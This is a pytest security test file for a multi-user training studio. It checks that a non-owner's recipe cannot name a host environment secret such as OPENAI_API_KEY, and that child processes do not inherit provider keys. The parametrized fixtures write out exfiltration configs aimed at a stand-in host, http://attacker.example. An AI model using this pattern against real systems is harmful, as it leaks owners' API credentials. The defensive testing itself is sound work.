# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""A managed recipe must not be able to name a host environment secret.

Data Designer 0.5.4 resolves ModelProvider.api_key through
CompositeResolver([EnvironmentResolver(), PlaintextResolver()]), so a bare env var
name in api_key is replaced by that variable's value before it goes out as a bearer
token to the provider endpoint the same recipe supplies.
"""

from __future__ import annotations

import multiprocessing
import os

import pytest
from fastapi import HTTPException

from auth import policy
from core.training import account_jobs as jobs
from utils.account_context import AccountContext, OWNER, run_as

ALICE = AccountContext("alice-secret-account", "alice")


@pytest.fixture(autouse = True)
def multi(monkeypatch):
    monkeypatch.setattr(policy, "installation_is_multi_user", lambda: True)
    monkeypatch.setattr(jobs, "_retired", set())


@pytest.mark.parametrize(
    "recipe",
    [
        {
            "model_providers": [
                {
                    "name": "exfil",
                    "endpoint": "http://attacker.example/v1",
                    "provider_type": "openai",
                    "api_key": "OPENAI_API_KEY",
                }
            ]
        },
        {
            "mcp_providers": [
                {
                    "name": "exfil",
                    "endpoint": "http://attacker.example/mcp",
                    "provider_type": "streamable_http",
                    "api_key": "OPENAI_API_KEY",
                }
            ]
        },
        {"seed_config": {"source": {"seed_type": "hf", "token": "OPENAI_API_KEY"}}},
    ],
)
def test_managed_recipe_cannot_name_a_host_environment_secret(monkeypatch, recipe):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-owner-host-secret")
    with pytest.raises(HTTPException) as exc:
        run_as(ALICE, jobs.validate_recipe_access, recipe)
    assert exc.value.status_code == 403
    run_as(OWNER, jobs.validate_recipe_access, recipe)


def test_managed_recipe_keeps_accepting_plaintext_credentials(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-owner-host-secret")
    recipe = {
        "model_providers": [
            {
                "name": "mine",
                "endpoint": "https://api.openai.com/v1",
                "provider_type": "openai",
                "api_key": "sk-alice-own-key",
            }
        ]
    }
    run_as(ALICE, jobs.validate_recipe_access, recipe)


def _provider_secret_probe(result_queue):
    result_queue.put({name: os.environ.get(name) for name in _PROVIDER_SECRETS})


_PROVIDER_SECRETS = (
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "NVIDIA_API_KEY",
    "OPENROUTER_API_KEY",
)


def test_child_scrubs_model_provider_secrets(monkeypatch):
    for name in _PROVIDER_SECRETS:
        monkeypatch.setenv(name, f"owner-{name}")
    ctx = multiprocessing.get_context("spawn")
    result_queue = ctx.Queue()
    process = ctx.Process(
        target = jobs.run_account_child,
        kwargs = {
            "account": ALICE,
            "job_module": __name__,
            "job_target": "_provider_secret_probe",
            "result_queue": result_queue,
        },
    )
    process.start()
    try:
        result = result_queue.get(timeout = 60)
        process.join(timeout = 10)
        assert process.exitcode == 0
    finally:
        if process.is_alive():
            process.terminate()
            process.join(timeout = 5)
        result_queue.close()
    assert all(value is None for value in result.values()), result
    assert os.environ["OPENAI_API_KEY"] == "owner-OPENAI_API_KEY"
